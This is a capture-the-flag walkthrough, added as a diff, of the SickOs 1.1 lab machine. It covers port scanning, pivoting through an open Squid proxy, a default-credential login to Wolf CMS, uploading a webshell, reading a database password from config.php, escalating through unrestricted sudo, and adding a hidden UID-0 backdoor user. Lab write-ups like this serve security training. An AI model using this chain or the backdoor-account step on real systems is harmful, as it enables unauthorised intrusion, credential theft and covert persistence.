@@ -1,0 +1,207 @@
+
+IP - 10.0.2.13
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Nmap All Port Scan Result
+
+┌──(root㉿kali)-[~/Desktop/vulhub/sick0s1.1]
+└─# nmap -sC -sV 10.0.2.13 -p- -oN nmap_all_port.txt
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-19 19:06 +0630
+Stats: 0:01:05 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 46.84% done; ETC: 19:09 (0:01:08 remaining)
+Nmap scan report for 10.0.2.13
+Host is up (0.00018s latency).
+Not shown: 65532 filtered tcp ports (no-response)
+PORT     STATE  SERVICE    VERSION
+22/tcp   open   ssh        OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   1024 093d29a0da4814c165141e6a6c370409 (DSA)
+|   2048 8463e9a88e993348dbf6d581abf208ec (RSA)
+|_  256 51f6eb09f6b3e691ae36370cc8ee3427 (ECDSA)
+3128/tcp open   http-proxy Squid http proxy 3.1.19
+|_http-title: ERROR: The requested URL could not be retrieved
+|_http-server-header: squid/3.1.19
+| http-open-proxy: Potentially OPEN proxy.
+|_Methods supported: GET HEAD
+8080/tcp closed http-proxy
+MAC Address: 08:00:27:25:46:FF (Oracle VirtualBox virtual NIC)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 127.74 seconds
+
+
+Found port 3128 http-proxy is open. So, I research about that port and found https://book.hacktricks.xyz/network-services-pentesting/3128-pentesting-squid this article from hacktricks. I read how it work and use https://github.com/aancw/spose spose.py python and found out 10.0.2.13 port 80 is open with proxy.
+
+┌──(root㉿kali)-[~/Desktop/tools/spose]
+└─# python spose.py --proxy http://10.0.2.13:3128 --target 10.0.2.13
+Using proxy address http://10.0.2.13:3128
+10.0.2.13 22 seems OPEN 
+10.0.2.13 80 seems OPEN
+
+So, I decided to view this page from firefox first I need to use proxy I added proxy into foxy proxy with IP 10.0.2.13 and port number 3128.
+
+After that I turn proxy on and go to 10.0.2.13:80 and Found default page.
+
+<h1>
+BLEHHH!!!
+</h1>
+
+Then, I go to /robots.txt and found:
+
+/wolfcms
+
+Wolfcms location is found.
+
+I run dirsearch with proxy:
+
+┌──(root㉿kali)-[~]
+└─# dirsearch -u http://10.0.2.13/wolfcms/ -e php -f -x 400,403 --proxy=http://10.0.2.13:3128
+
+  _|. _ _  _  _  _ _|_    v0.4.2                                                                                                                                                            
+ (_||| _) (/_(_|| (_| )                                                                                                                                                                     
+                                                                                                                                                                                            
+Extensions: php | HTTP method: GET | Threads: 30 | Wordlist size: 13441
+
+Output File: /root/.dirsearch/reports/10.0.2.13/-wolfcms-_23-01-19_19-24-03.txt
+
+Error Log: /root/.dirsearch/logs/errors-23-01-19_19-24-03.log
+
+Target: http://10.0.2.13/wolfcms/
+
+[19:24:03] Starting: 
+[19:24:06] 200 -    4KB - /wolfcms/CONTRIBUTING.md                          
+[19:24:07] 200 -    2KB - /wolfcms/README.md                                
+[19:24:17] 200 -  403B  - /wolfcms/composer.json                            
+[19:24:17] 200 -    0B  - /wolfcms/config.php                               
+[19:24:17] 200 -    0B  - /wolfcms/config/
+[19:24:17] 200 -    0B  - /wolfcms/config
+[19:24:17] 200 -    0B  - /wolfcms/config/app.php                           
+[19:24:17] 200 -    0B  - /wolfcms/config/app.yml                           
+[19:24:17] 200 -    0B  - /wolfcms/config/apc.php
+[19:24:17] 200 -    0B  - /wolfcms/config/AppData.config
+[19:24:17] 200 -    0B  - /wolfcms/config/banned_words.txt
+[19:24:17] 200 -    0B  - /wolfcms/config/aws.yml
+[19:24:17] 200 -    0B  - /wolfcms/config/autoload/
+[19:24:17] 200 -    0B  - /wolfcms/config/config.inc
+[19:24:17] 200 -    0B  - /wolfcms/config/database.yml.pgsql
+[19:24:17] 200 -    0B  - /wolfcms/config/config.ini
+[19:24:17] 200 -    0B  - /wolfcms/config/database.yml
+[19:24:17] 200 -    0B  - /wolfcms/config/database.yml~
+[19:24:17] 200 -    0B  - /wolfcms/config/database.yml_original
+[19:24:17] 200 -    0B  - /wolfcms/config/database.yml.sqlite3
+[19:24:17] 200 -    0B  - /wolfcms/config/databases.yml
+[19:24:17] 200 -    0B  - /wolfcms/config/db.inc
+[19:24:17] 200 -    0B  - /wolfcms/config/development/
+[19:24:17] 200 -    0B  - /wolfcms/config/initializers/secret_token.rb
+[19:24:17] 200 -    0B  - /wolfcms/config/master.key
+[19:24:17] 200 -    0B  - /wolfcms/config/monkcheckout.ini
+[19:24:17] 200 -    0B  - /wolfcms/config/monkdonate.ini
+[19:24:17] 200 -    0B  - /wolfcms/config/monkid.ini
+[19:24:17] 200 -    0B  - /wolfcms/config/producao.ini
+[19:24:17] 200 -    0B  - /wolfcms/config/settings.inc
+[19:24:17] 200 -    0B  - /wolfcms/config/settings.local.yml
+[19:24:17] 200 -    0B  - /wolfcms/config/routes.yml
+[19:24:17] 200 -    0B  - /wolfcms/config/settings.ini
+[19:24:17] 200 -    0B  - /wolfcms/config/settings/production.yml
+[19:24:17] 200 -    0B  - /wolfcms/config/site.php
+[19:24:17] 200 -    0B  - /wolfcms/config/settings.ini.cfm
+[19:24:17] 200 -    0B  - /wolfcms/config/xml/
+[19:24:19] 200 -    2KB - /wolfcms/docs/                                    
+[19:24:19] 301 -  313B  - /wolfcms/docs  ->  http://10.0.2.13/wolfcms/docs/ 
+[19:24:19] 200 -    7KB - /wolfcms/docs/updating.txt                        
+[19:24:20] 200 -  894B  - /wolfcms/favicon.ico                              
+[19:24:22] 200 -    4KB - /wolfcms/index.php                                
+[19:24:22] 200 -    4KB - /wolfcms/index
+[19:24:22] 200 -    4KB - /wolfcms/index/                                   
+[19:24:22] 200 -    4KB - /wolfcms/index.php/login/                         
+[19:24:30] 301 -  315B  - /wolfcms/public  ->  http://10.0.2.13/wolfcms/public/
+[19:24:30] 200 -    1KB - /wolfcms/public/                                  
+[19:24:31] 200 -    0B  - /wolfcms/robots.txt                               
+                                                                             
+Task Completed
+
+I found admin login panel and login with default username and password:
+
+admin
+admin
+
+I got login into admin panel and upload webshell:
+
+http://10.0.2.13/wolfcms/?/admin/plugin/file_manager/browse//		(Upload webshell from here)
+
+http://10.0.2.13/wolfcms/public/__welcome.php
+
+Got reverse shell from https://www.revshells.com/
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+And then, I uploaded linpeas.sh and run it.
+
+Found user sickos password from wolfcms config.php
+
+www-data@SickOs:/tmp$ cat /var/www/wolfcms/config.php
+<?php 
+
+// Database information:
+// for SQLite, use sqlite:/tmp/wolf.db (SQLite 3)
+// The path can only be absolute path or :memory:
+// For more info look at: www.php.net/pdo
+
+// Database settings:
+define('DB_DSN', 'mysql:dbname=wolf;host=localhost;port=3306');
+define('DB_USER', 'root');
+define('DB_PASS', 'john@123');
+define('TABLE_PREFIX', '');
+
+
+username - sickos
+password - john@123
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+Priv Escalation
+
+
+I run sudo -l and found:
+
+User sickos may run the following commands on this host:
+    (ALL : ALL) ALL
+
+
+we can run whatever we like with sudo.
+
+So, I swith root with sudo su
+
+sickos@SickOs:~/.cache$ sudo su
+root@SickOs:/home/sickos/.cache# whoami
+root
+
+Flag
+
+root@SickOs:~# cat a0216ea4d51874464078c618298b1367.txt 
+If you are viewing this!!
+
+ROOT!
+
+You have Succesfully completed SickOS1.1.
+Thanks for Trying
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Add new user as root 
+
+root@vulnix:~# useradd -ou 0 -g 0 lol
+root@vulnix:~# passwd lol
+Enter new UNIX password: 
+Retype new UNIX password: 
+passwd: password updated successfully
+
+user - lol
+password - test1234
+
+
